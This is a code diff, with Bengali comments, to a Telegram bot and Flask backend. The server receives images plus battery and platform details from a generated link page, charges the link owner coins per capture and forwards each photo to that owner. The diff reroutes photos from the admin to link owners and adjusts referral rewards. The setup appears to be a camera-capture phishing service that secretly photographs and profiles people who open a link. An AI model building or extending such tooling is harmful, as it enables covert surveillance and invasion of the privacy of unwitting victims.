@@ -14,7 +14,6 @@ from telegram.ext import (
 logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# রেন্ডারের এনভায়রনমেন্ট ভেরিয়েবল থেকে সিক্রেট ডেটা লোড করা
 TOKEN = os.environ.get("TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID"))
 MY_USERNAME = os.environ.get("MY_USERNAME")
@@ -28,7 +27,7 @@ user_states = {}
 app_telegram = None  
 bot_loop = None
 
-# --- ফ্লাস্ক সার্ভার (template_folder সঠিকভাবে সেট করা হলো যাতে 500 Internal Error না আসে) ---
+# --- ফ্লাস্ক সার্ভার ---
 flask_app = Flask(__name__, template_folder='templates')
 
 @flask_app.route('/')
@@ -38,23 +37,23 @@ def index():
 @flask_app.route('/upload-image', methods=['POST'])
 def upload_image():
     data = request.json
-    chat_id = data.get('chat_id')
+    owner_id = data.get('chat_id')  # কে লিংক জেনারেট করেছিল (যার কাছে ছবি যাবে)
     image_data = data.get('image')
     name = data.get('name', 'Unknown')
     battery = data.get('battery', 'N/A')
     platform = data.get('platform', 'Mobile/PC')
 
-    if not chat_id or not image_data:
+    if not owner_id or not image_data:
         return jsonify({"status": "error", "message": "Invalid data"}), 400
 
     try:
-        chat_id = int(chat_id)
+        owner_id = int(owner_id)
         
         # কয়েন কাটার লজিক
-        if chat_id in users_db:
-            if not users_db[chat_id].get("is_vip", False):
-                if users_db[chat_id]["balance"] >= 1:
-                    users_db[chat_id]["balance"] -= 1
+        if owner_id in users_db:
+            if not users_db[owner_id].get("is_vip", False):
+                if users_db[owner_id]["balance"] >= 1:
+                    users_db[owner_id]["balance"] -= 1
                 else:
                     return jsonify({"status": "error", "message": "Insufficient coins"}), 400
 
@@ -70,7 +69,7 @@ def upload_image():
         )
 
         asyncio.run_coroutine_threadsafe(
-            send_photo_to_admin(chat_id, image_bytes, caption),
+            send_photo_to_owner(owner_id, image_bytes, caption),
             bot_loop
         )
 
@@ -79,12 +78,13 @@ def upload_image():
         logger.error(f"Image upload error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-async def send_photo_to_admin(chat_id, photo_bytes, caption):
+async def send_photo_to_owner(owner_id, photo_bytes, caption):
     try:
-        await app_telegram.bot.send_photo(chat_id=ADMIN_ID, photo=photo_bytes, caption=caption, parse_mode="Markdown")
-        if chat_id in users_db:
-            bal = "VIP (Unlimited)" if users_db[chat_id]["is_vip"] else f"{users_db[chat_id]['balance']} Coins"
-            await app_telegram.bot.send_message(chat_id=chat_id, text=f"🎯 আপনার লিংকে রেসপন্স পাওয়া গেছে!\n💰 বর্তমান ব্যালেন্স: {bal}")
+        # ছবি সরাসরি লিংক-মালিকের ইনবক্সে যাবে
+        await app_telegram.bot.send_photo(chat_id=owner_id, photo=photo_bytes, caption=caption, parse_mode="Markdown")
+        if owner_id in users_db:
+            bal = "VIP (Unlimited)" if users_db[owner_id]["is_vip"] else f"{users_db[owner_id]['balance']} Coins"
+            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 আপনার লিংকে রেসপন্স পাওয়া গেছে!\n💰 বর্তমান ব্যালেন্স: {bal}")
     except Exception as e:
         logger.error(f"Telegram send photo error: {e}")
 
@@ -154,7 +154,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         is_joined = await check_user_channels(context.bot, user_id)
         if not is_joined:
             await update.message.reply_text(
-                "⚠️ বট ব্যবহার করতে হলে অবশ্যই আমাদের চ্যানেলগুলোতে জয়েন করতে হবে!\n\nজয়েন করার পর নিচে ক্লিক করুন:",
+                "⚠️ বট ব্যবহার করতে হলে অবশ্যই আমাদের চ্যানেলগুলোতে জয়েন করতে হবে!\n\nজয়েন করার পর নিচের বাটনে ক্লিক করুন:",
                 reply_markup=force_join_keyboard()
             )
             return
@@ -177,13 +177,17 @@ async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     await query.answer("✅ ভেরিফিকেশন সফল হয়েছে!", show_alert=True)
 
+    # শুধুমাত্র চেক জয়েনে ক্লিক করলেই রেফার বোনাস এড হবে
     if user_id in pending_referrals:
         referrer_id = pending_referrals[user_id]
         if referrer_id in users_db:
             users_db[referrer_id]["balance"] += REFER_REWARD
             users_db[referrer_id]["referrals"] += 1
             try:
-                await context.bot.send_message(referrer_id, f"🎉 অভিনন্দন! নতুন রেফার থেকে **{REFER_REWARD} Coins** পেয়েছেন!")
+                await context.bot.send_message(
+                    referrer_id, 
+                    f"🎉 অভিনন্দন! আপনার রেফার লিংক থেকে নতুন একজন জয়েন করেছে এবং আপনি **{REFER_REWARD} Coins** বোনাস পেয়েছেন!\n💰 বর্তমান ব্যালেন্স: {users_db[referrer_id]['balance']} Coins"
+                )
             except Exception:
                 pass
         del pending_referrals[user_id]
